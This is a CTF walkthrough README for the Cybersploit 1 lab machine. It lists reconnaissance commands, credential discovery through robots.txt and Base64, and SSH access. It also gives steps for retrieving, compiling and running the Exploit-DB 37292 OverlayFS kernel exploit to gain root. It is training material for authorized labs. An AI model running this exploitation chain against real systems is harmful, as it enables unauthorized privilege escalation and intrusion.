# Cybersploit 1 — CTF Walkthrough

A complete penetration-testing walkthrough of the **Cybersploit 1 CTF machine**, covering reconnaissance, enumeration, credential discovery, SSH access, Linux kernel vulnerability research, and privilege escalation to root.

> **Lab Environment:** Authorized CTF / vulnerable virtual machine
> **Attacker:** Kali Linux
> **Target:** Cybersploit 1
> **Focus:** Linux Privilege Escalation

## Attack Chain

```text
Network Discovery
       ↓
Nmap Enumeration
       ↓
HTTP Service
       ↓
Source-Code Analysis
       ↓
Username Discovery
       ↓
robots.txt
       ↓
Base64 Credential Discovery
       ↓
SSH Access
       ↓
Local Enumeration
       ↓
Kernel Version Identification
       ↓
Exploit-DB Research
       ↓
OverlayFS Privilege Escalation
       ↓
Root
       ↓
Flag Discovery
```

## Skills Demonstrated

* Network reconnaissance
* Host discovery
* Nmap enumeration
* Service/version enumeration
* Web reconnaissance
* HTML source-code analysis
* `robots.txt` enumeration
* Base64 decoding
* SSH authentication
* Linux local enumeration
* Kernel version identification
* Vulnerability research
* SearchSploit / Exploit-DB
* SCP file transfer
* GCC compilation
* Linux privilege escalation
* Root verification
* CTF flag discovery

## Tools Used

* Kali Linux
* Netdiscover
* Nmap
* SearchSploit
* SSH
* SCP
* GCC
* Linux command-line utilities

## Important Commands

### Network Discovery

```bash
netdiscover
netdiscover -r 192.168.29.0/24
```

### Nmap Enumeration

```bash
nmap -sC -sV 192.168.29.32
nmap -p- -sC -sV 192.168.29.32
```

### SSH

```bash
ssh itsskv@192.168.29.32
```

### Local Enumeration

```bash
uname -a
whoami
id
```

### Vulnerability Research

```bash
searchsploit 37292
searchsploit -m 37292
```

### Transfer Exploit

```bash
scp 37292.c itsskv@192.168.29.32:/home/itsskv/
```

### Compile

```bash
gcc /home/itsskv/37292.c -o /tmp/exploit
```

### Execute

```bash
/tmp/exploit
```

### Verify Privileges

```bash
whoami
id
```

### Flag Discovery

```bash
find / -type f -iname "*flag*" 2>/dev/null
find / -type f -iname "*final*" 2>/dev/null
```

## Key Takeaways

1. Perform reconnaissance before exploitation.
2. Enumerate open ports and service versions.
3. Inspect web source code and exposed files such as `robots.txt`.
4. Remember that Base64 is encoding, not encryption.
5. After obtaining an initial shell, perform local enumeration.
6. Use `uname -a` to identify the kernel and architecture.
7. Research vulnerable kernel versions before attempting privilege escalation.
8. Transfer exploit source from the machine where the source actually exists.
9. Verify successful privilege escalation with `whoami` and `id`.
10. Pay attention to Linux path and filename case sensitivity.

## Walkthrough

The detailed step-by-step walkthrough is available here:

📄 **[Cybersploit 1 CTF Walkthrough](./walkthrough/Cybersploit-1-CTF-Walkthrough.pdf)**

## Disclaimer

This repository is intended for **authorized cybersecurity training, CTF competitions, and educational lab environments only**.

Do not use these techniques against systems without explicit authorization.

## Author

**Alen**

Cybersecurity | CTFs | SOC | Penetration Testing | Linux


---

## Portfolio navigation

This repository is part of my hands-on cybersecurity learning portfolio by **Alen Sales K S**. I document lab work to make the methodology, evidence, limitations, and lessons learned easier to review.

- [Cybersploit 2 CTF Walkthrough](https://github.com/zales2004/cybersploit-2-ctf-walkthrough)
- [Metasploitable 2 Lab](https://github.com/zales2004/metasploitable-2-ctf-walkthrough)
- [Sunset: Noontide](https://github.com/zales2004/sunset-noontide-pentesting)

## Scope and responsible use

All security testing described here is for authorized training environments, intentionally vulnerable targets, or systems I own or have permission to assess. Findings should be interpreted in the context of the documented lab and supporting evidence; they should not be treated as proof of compromise on unrelated real-world systems.
